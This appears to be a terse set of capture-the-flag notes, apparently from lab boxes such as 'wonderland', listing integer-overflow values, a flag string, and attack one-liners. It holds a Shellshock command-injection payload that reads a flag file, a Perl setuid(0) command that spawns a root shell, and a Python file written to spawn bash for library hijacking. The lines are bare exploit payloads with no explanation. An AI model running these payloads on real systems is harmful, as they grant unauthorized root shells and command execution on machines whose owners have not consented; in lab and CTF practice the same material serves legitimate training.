4294967295
2147483647
env x='() { :;}; /bin/cat flag' bash -c ./shellshock:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
WhyIsARavenLike_WritingDesk?

alice@wonderland:~$ cd /home/alice/
alice@wonderland:~$ cat > random.py << EOF
import os
os.system("/bin/bash")
EOF
